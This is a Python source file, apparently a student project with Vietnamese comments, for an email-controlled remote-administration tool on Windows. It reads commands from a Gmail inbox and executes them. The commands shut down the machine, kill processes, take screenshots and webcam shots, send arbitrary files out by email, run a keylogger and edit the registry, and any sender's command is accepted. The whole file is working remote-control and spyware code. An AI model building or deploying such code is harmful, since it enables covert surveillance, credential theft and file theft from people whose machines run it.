import sys
import ctypes
from config import *
import imap
import psutil
import os
import time
import smtp
from datetime import datetime
import keylog as kl
import registry as reg
import utils
import threading


dir_data = "data/"


def getListOfProcessSortedByMemory():

    # Lấy danh sách proccess theo Memory Usage
    listOfProcObjects = []

    for proc in psutil.process_iter():
        try:
            # Fetch process details as dict
            pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
            pinfo['vms'] = proc.memory_info().vms / (1024 * 1024)
            # Append dict to list
            listOfProcObjects.append(pinfo)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    # Sort list of dict by key vms i.e. memory usage
    listOfProcObjects = sorted(
        listOfProcObjects, key=lambda procObj: procObj['vms'], reverse=True)
    return listOfProcObjects


def execute_one_command(cmd):
    dir_file = None
    # cmd = 'shutdown 12345'
    # cmd = 'shutdown 12345 --10'
    if cmd.startswith("shutdown"):
        do = "shutdown /s"
        if("--" in cmd and cmd[cmd.find('--') + 2:].isnumeric()):
            do += " /t " + cmd[cmd.find('--') + 2:]

        threading.Timer(5, function=os.system, args=(do,)).start()
        # os.system(do)
        return [cmd, "Shutdown completed!"]  # [subject, text]

    # cmd = 'restart --10'
    # cmd = 'restart 12345 --10'
    elif cmd.startswith("restart"):
        do = "shutdown /r"
        if("--" in cmd and cmd[cmd.find('--') + 2:].isnumeric()):
            do += " /t " + cmd[cmd.find('--') + 2:]

        threading.Timer(5, function=os.system, args=(do, )).start()
        # os.system(do)
        return [cmd, "Restart completed!"]  # [subject, text]

    # Ngu dong
    # cmd = 'hibernate 12345'
    # cmd = 'hibernate 12345 --10'
    elif cmd.startswith("hibernate"):
        do = "shutdown /h"
        if("--" in cmd and cmd[cmd.find('--') + 2:].isnumeric()):
            do += " /t " + cmd[cmd.find('--') + 2:]

        threading.Timer(5, function=os.system, args=(do, )).start()
        # os.system(do)
        return [cmd, "Hibernate completed!"]  # [subject, text]

    # list 12345: list tat ca process
    # list 12345 --10: list 10 process su dung nhieu Memory Usage nhat
    elif cmd.startswith("list"):
        text = ""
        if not '--' in cmd:
            listOfRunningProcess = getListOfProcessSortedByMemory()
            text = "List all processes: complete!"
        elif len(cmd) > 13:
            if cmd[13:].isnumeric():
                listOfRunningProcess = getListOfProcessSortedByMemory()[
                    :int(cmd[13:])]
                text = "List " + cmd[13:] + " processes: complete!"
            else:
                listOfRunningProcess = []
                text = "Invalid command"
        else:
            listOfRunningProcess = []
            text = 'Invalid command'

        #dir_file = dir_data + cmd + ".txt"
        #f = open(dir_file, "w+")
        content = ""
        if listOfRunningProcess:
            content += '\nPID --- NAME --- USERNAME --- VMS'
            for proc in listOfRunningProcess:
                content += '\n' + ' --- '.join([str(proc['pid']), str(proc['name']), str(proc['username']), str(proc['vms'])])

        # chuyen list dictionary sang chuoi
        # listOfRunningProcess = [str(x) for x in listOfRunningProcess]
        # listOfRunningProcess = '\n'.join(listOfRunningProcess)
        #f.write(listOfRunningProcess)
        #f.close()

        return [cmd, text + content]  # [subject, text, filepath]

    # kill 12345 --chrome messenger
    elif cmd.startswith("kill"):
        if len(cmd) < 14:
            return [cmd, "Invalid command"]

        list_proc = cmd[13:].split()
        print(len(list_proc), list_proc)
        result = []
        for killed_proc in list_proc:
            for proc in psutil.process_iter():
                if killed_proc.lower() in proc.name().lower():
                    proc.kill()
                    if(len(result) == 0 or (len(result) > 0 and result[len(result) - 1] != proc.name())):
                        result.append(proc.name())
        # dir_file = dir_data + "killed_list.txt"
        text = "There are " + str(len(result)) + "/" + \
            str(len(list_proc)) + " proccess killed"
        # f = open(dir_file, "w+")
        # f.write(text)
        # for item in result:
        #     f.write(item)
        # f.close()
        return [cmd, text]  # [subject, text, filepath]

    # screenshot 12345
    elif cmd.startswith('screenshot'):
        filepath = smtp.screenshot()
        now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
        return [cmd, f"Screenshot at {now}", filepath]

    # webcamshot 12345
    elif cmd.startswith('webcamshot'):
        filepath = smtp.webcamshot()
        now = datetime.now().strftime("%H:%M:%S, %Y/%m/%d")
        return [cmd, f"Webcamshot at {now}", filepath]

    # filecopy 12345 file_path
    elif cmd.startswith('filecopy'):
        filepath = (' ').join(cmd.split(' ')[2:])
        return [cmd, f"File copy at {filepath}", filepath]

    # cmd = 'keylog 12345'
    elif cmd.startswith('keylog'):
        keys_pressed = kl.keylog()
        return [cmd, keys_pressed]

    # cmd = 'regedit 12345 HKEY_CURRENT_USER|Software\\SampleKey<>binvalue<>12'
    elif cmd.startswith('regedit'):
        id, basekey, subkey, name, value = reg.parse_regedit_cmd(cmd)
        # print(id, basekey, subkey, name, value)
        if id is None:
            return [cmd, 'Invalid regedit command']

        res = reg.edit_registry(basekey, subkey, name, value)
        return [cmd, res]
    else:
        return [cmd, 'Invalid command']


def handle_request(main_sender: smtp.MailSender, user_mail: str, cmd: str):
    print('Executing', cmd, 'from', user_mail)
    result = execute_one_command(cmd)
    print('Sending result to', user_mail)
    sender.send_attached_email(
        user_mail, result[0], result[1], result[2] if len(result) == 3 else None)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if __name__ == '__main__':

    gmail = '@gmail.com'
    password = ''
    handler = imap.MailFetcher(gmail, password)
    sender = smtp.MailSender(gmail, password)

    try:
        while True:
            # print('Idling...\t Press Ctrl + C to escape')
            user_mail, cmd = handler.fetch_newest()
            if user_mail and cmd:
                # cmd_list.append([user_mail, cmd, False])
                threading.Thread(target=handle_request, daemon=True, args=(
                    sender, user_mail, cmd)).start()

    except KeyboardInterrupt:
        print('Ctrl C pressed')
        utils.remove_files('data', '.jpg')
        utils.remove_files('data', '.txt')
